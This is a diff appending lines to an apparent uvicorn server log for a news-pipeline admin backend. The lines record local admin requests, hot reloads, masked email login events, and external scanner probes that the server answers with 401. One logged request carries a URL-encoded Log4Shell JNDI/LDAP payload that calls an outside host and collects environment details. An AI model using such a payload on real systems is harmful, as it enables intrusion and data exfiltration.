@@ -773,3 +773,386 @@ INFO:     127.0.0.1:39000 - "GET /pipelines/10 HTTP/1.1" 200 OK
 [DEBUG] update pipeline pid=10 weekdays_json=[1]
 INFO:     127.0.0.1:40826 - "PUT /pipelines/10 HTTP/1.1" 200 OK
 INFO:     127.0.0.1:40828 - "GET /pipelines/10 HTTP/1.1" 200 OK
+INFO:     87.120.191.37:31514 - "GET /json/ HTTP/1.1" 401 Unauthorized
+INFO:     207.90.244.28:33310 - "GET / HTTP/1.1" 401 Unauthorized
+INFO:     207.90.244.28:33312 - "GET /favicon.ico HTTP/1.1" 401 Unauthorized
+INFO:     165.154.172.72:37582 - "GET / HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     152.32.245.186:52116 - "GET / HTTP/1.1" 401 Unauthorized
+INFO:     152.32.245.186:52298 - "GET /favicon.ico HTTP/1.1" 401 Unauthorized
+INFO:     152.32.245.186:52432 - "GET /robots.txt HTTP/1.1" 401 Unauthorized
+INFO:     152.32.245.186:52434 - "GET /sitemap.xml HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+INFO:     194.164.107.6:56082 - "GET / HTTP/1.1" 401 Unauthorized
+INFO:     185.180.141.50:36759 - "GET / HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     64.62.197.167:65210 - "GET / HTTP/1.1" 401 Unauthorized
+INFO:     64.62.197.175:53155 - "GET /?format=json HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+INFO:     127.0.0.1:60484 - "GET /me HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60474 - "GET /options HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60500 - "GET /me HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60498 - "GET /options HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60516 - "GET /pipelines/10 HTTP/1.1" 200 OK
+INFO:     198.235.24.176:61968 - "GET / HTTP/1.1" 401 Unauthorized
+INFO:     198.235.24.255:59400 - "GET / HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+INFO:     162.142.125.214:48226 - "GET / HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     162.142.125.214:48248 - "GET /sitemap.xml HTTP/1.1" 401 Unauthorized
+INFO:     87.121.84.50:37354 - "GET / HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+INFO:     87.121.84.50:37376 - "GET / HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     159.89.29.248:58080 - "GET / HTTP/1.1" 401 Unauthorized
+INFO:     3.132.23.201:51134 - "GET / HTTP/1.1" 401 Unauthorized
+INFO:     3.132.23.201:57422 - "GET / HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     204.76.203.18:58792 - "GET / HTTP/1.1" 401 Unauthorized
+INFO:     204.76.203.18:45318 - "GET /bins/ HTTP/1.1" 401 Unauthorized
+INFO:     204.76.203.18:54890 - "GET /bin/ HTTP/1.1" 401 Unauthorized
+INFO:     204.76.203.18:48618 - "GET /backup/ HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     127.0.0.1:40454 - "GET /me HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40468 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40478 - "GET /me HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40482 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:32900 - "GET /sources HTTP/1.1" 200 OK
+INFO:     127.0.0.1:32904 - "GET /categories HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55202 - "GET /sources HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55212 - "GET /categories HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48700 - "GET /categories HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48706 - "GET /categories HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55320 - "GET /ai-metrics HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55322 - "GET /ai-metrics HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55324 - "GET /categories HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55334 - "GET /sources HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55350 - "GET /infos?page=1&page_size=20 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55356 - "GET /categories HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55360 - "GET /sources HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55374 - "GET /infos?page=1&page_size=20 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45306 - "GET /admin/users?page=1&page_size=20 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45308 - "GET /admin/users?page=1&page_size=20 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39998 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40014 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     45.135.194.44:30891 - "GET /%24%7Bjndi%3Aldap%3A//45.135.194.44%3A1389/x_VkYUAfCgAXWwhpAAAAAPjpzM8/%24%7Bjava%3Aos%7D%3B~%24%7Bjava%3Aversion%7D%3B~%24%7Bjava%3Aruntime%7D%3B~%24%7Bjava%3Alocale%7D%3B~%24%7Bsys%3Ajava.class.path%7D%3B~%24%7Bsys%3Auser.country%7D%3B~%24%7Bsys%3Auser.timezone%7D%3B~%24%7Benv%3AUSER%7D%3B~%24%7Benv%3AUSERNAME%7D%3B~%24%7Benv%3APWD%7D%3B~%24%7Benv%3AHOSTNAME%7D%7D HTTP/1.1" 401 Unauthorized
+INFO:     45.156.129.137:53583 - "GET / HTTP/1.1" 401 Unauthorized
+INFO:     45.156.129.138:59167 - "GET /helpdesk/WebObjects/Helpdesk.woa HTTP/1.1" 401 Unauthorized
+INFO:     45.156.129.138:34429 - "GET /owncloud/status.php HTTP/1.1" 401 Unauthorized
+INFO:     45.156.129.137:35209 - "GET /status.php HTTP/1.1" 401 Unauthorized
+INFO:     45.156.129.137:42557 - "GET /api/session/properties HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+INFO:     45.156.129.136:53963 - "GET /admin/ HTTP/1.1" 401 Unauthorized
+INFO:     45.156.129.137:53199 - "GET / HTTP/1.1" 401 Unauthorized
+INFO:     45.156.129.138:59751 - "GET / HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:53848 - "GET /pipelines HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:53854 - "GET /me HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:53856 - "GET /me HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:53864 - "GET /pipelines HTTP/1.1" 401 Unauthorized
+[auth] login code sent to 3***@qq.com via local SMTP 127.0.0.1:25/sendmail
+INFO:     127.0.0.1:56440 - "POST /auth/login/code HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40502 - "POST /auth/login/verify HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47768 - "POST /auth/logout HTTP/1.1" 200 OK
+[auth] login code sent to p***@gmail.com via local SMTP 127.0.0.1:25/sendmail
+INFO:     127.0.0.1:42564 - "POST /auth/login/code HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40344 - "POST /auth/login/verify HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40354 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40370 - "GET /me HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40382 - "GET /me HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40392 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40398 - "POST /auth/logout HTTP/1.1" 200 OK
+[auth] login code sent to 3***@qq.com via local SMTP 127.0.0.1:25/sendmail
+INFO:     127.0.0.1:35736 - "POST /auth/login/code HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41862 - "POST /auth/login/verify HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41872 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41874 - "GET /me HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41876 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41880 - "GET /me HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53452 - "GET /sources HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53462 - "GET /categories HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53478 - "GET /sources HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53488 - "GET /categories HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53496 - "GET /categories HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53508 - "GET /categories HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53514 - "GET /sources HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53528 - "GET /categories HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53536 - "GET /sources HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53542 - "GET /categories HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44380 - "GET /sources HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:44392 - "GET /me HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:44394 - "GET /categories HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:44398 - "GET /me HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:44406 - "GET /categories HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:44416 - "GET /sources HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:56448 - "GET /sources HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:56452 - "GET /categories HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:56456 - "GET /me HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:56468 - "GET /sources HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:56472 - "GET /me HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:56482 - "GET /categories HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:46830 - "GET /ai-metrics HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:46836 - "GET /ai-metrics HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:46846 - "GET /categories HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:46862 - "GET /sources HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:46872 - "GET /infos?page=1&page_size=20 HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:46888 - "GET /sources HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:46904 - "GET /categories HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:46914 - "GET /infos?page=1&page_size=20 HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:42354 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42368 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60752 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60756 - "GET /me HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60778 - "GET /me HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60766 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49860 - "GET /admin/users?page=1&page_size=20 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49870 - "GET /admin/users?page=1&page_size=20 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46066 - "GET /ai-metrics HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46076 - "GET /ai-metrics HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     127.0.0.1:51646 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51652 - "GET /me HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44992 - "GET /me HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45000 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     167.94.138.180:59140 - "GET / HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+INFO:     167.94.138.180:57156 - "GET / HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     167.94.138.180:60294 - "GET /sitemap.xml HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     207.90.244.14:48196 - "GET / HTTP/1.1" 401 Unauthorized
+INFO:     207.90.244.14:48200 - "GET /favicon.ico HTTP/1.1" 401 Unauthorized
+INFO:     205.210.31.194:60386 - "GET / HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     209.38.44.0:43694 - "GET / HTTP/1.1" 401 Unauthorized
+INFO:     209.38.44.0:43702 - "GET /login HTTP/1.1" 401 Unauthorized
+WARNING:  WatchFiles detected changes in 'backend/domain/weekday.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [814389]
+INFO:     Started server process [832022]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  WatchFiles detected changes in 'backend/db.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [832022]
+INFO:     Started server process [832075]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  WatchFiles detected changes in 'backend/db.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [832075]
+INFO:     Started server process [832108]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  WatchFiles detected changes in 'backend/main.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [832108]
+INFO:     Started server process [832150]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  WatchFiles detected changes in 'backend/main.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [832150]
+INFO:     Started server process [832187]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  WatchFiles detected changes in 'news-collector/write-deliver-pipeline/weekday.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [832187]
+INFO:     Started server process [832226]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  WatchFiles detected changes in 'news-collector/write-deliver-pipeline/pipeline_runner.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [832226]
+INFO:     Started server process [832286]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  WatchFiles detected changes in 'news-collector/write-deliver-pipeline/pipeline_runner.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [832286]
+INFO:     Started server process [832326]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  WatchFiles detected changes in 'news-collector/write-deliver-pipeline/pipeline_admin.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [832326]
+INFO:     Started server process [832369]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  WatchFiles detected changes in 'news-collector/write-deliver-pipeline/pipeline_admin.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [832369]
+INFO:     Started server process [832410]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+INFO:     127.0.0.1:52404 - "GET /me HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52394 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52410 - "GET /me HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52416 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55426 - "GET /options HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55440 - "GET /options HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55456 - "GET /pipelines/3 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60344 - "PUT /pipelines/3 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60354 - "GET /pipelines/3 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60364 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60368 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58110 - "GET /options HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58116 - "GET /options HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58132 - "GET /pipelines/8 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58134 - "PUT /pipelines/8 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55028 - "PUT /pipelines/8 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55030 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55044 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55048 - "GET /options HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55054 - "GET /options HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55064 - "GET /pipelines/9 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39096 - "PUT /pipelines/9 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39102 - "PUT /pipelines/9 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48402 - "PUT /pipelines/9 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48414 - "GET /pipelines/9 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48428 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45800 - "GET /options HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45810 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45818 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55186 - "GET /health HTTP/1.1" 200 OK
+INFO:     127.0.0.1:43468 - "GET /health HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40340 - "GET /me HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40324 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40352 - "GET /me HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40362 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45882 - "GET /options HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45892 - "GET /options HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45906 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47238 - "GET /options HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47242 - "GET /options HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47258 - "GET /pipelines/9 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47262 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47268 - "DELETE /pipelines/8 HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     36.156.22.4:47254 - "GET / HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     36.156.22.4:47286 - "GET /favicon.ico HTTP/1.1" 401 Unauthorized
+INFO:     36.156.22.4:47300 - "GET /robots.txt HTTP/1.1" 401 Unauthorized
+INFO:     36.156.22.4:47308 - "GET /.well-known/security.txt HTTP/1.1" 401 Unauthorized
+INFO:     36.156.22.4:47310 - "GET /sitemap.xml HTTP/1.1" 401 Unauthorized
+INFO:     36.156.22.4:53922 - "GET /llms.txt HTTP/1.1" 401 Unauthorized
+WARNING:  WatchFiles detected changes in 'backend/db.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [832410]
+INFO:     Started server process [834999]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  WatchFiles detected changes in 'backend/db.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [834999]
+INFO:     Started server process [835093]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+INFO:     127.0.0.1:53366 - "GET /me HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53354 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53384 - "GET /me HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53378 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49484 - "GET /options HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49492 - "GET /options HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49500 - "GET /pipelines/9 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58178 - "PUT /pipelines/9 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58192 - "GET /pipelines/9 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58204 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58206 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49850 - "GET /options HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49866 - "GET /options HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49872 - "GET /pipelines/3 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49876 - "POST /feishu/chats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52248 - "PUT /pipelines/3 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52258 - "GET /pipelines/3 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52270 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52278 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52280 - "PUT /pipelines/9 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52286 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52294 - "PUT /pipelines/10 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45980 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45988 - "PUT /pipelines/3 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45990 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46000 - "GET /options HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46006 - "GET /pipelines/3 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46010 - "PUT /pipelines/3 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46014 - "GET /pipelines/3 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46022 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46024 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34534 - "GET /options HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34540 - "GET /options HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34554 - "GET /pipelines/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57624 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57638 - "GET /me HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57642 - "GET /me HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57656 - "GET /pipelines HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57662 - "PUT /pipelines/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57670 - "GET /pipelines HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  WatchFiles detected changes in 'news-collector/write-deliver-pipeline/pipeline_runner.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [835093]
+INFO:     Started server process [836578]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  WatchFiles detected changes in 'news-collector/write-deliver-pipeline/pipeline_admin.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [836578]
+INFO:     Started server process [836630]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  WatchFiles detected changes in 'news-collector/write-deliver-pipeline/pipeline_admin.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [836630]
+INFO:     Started server process [836639]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
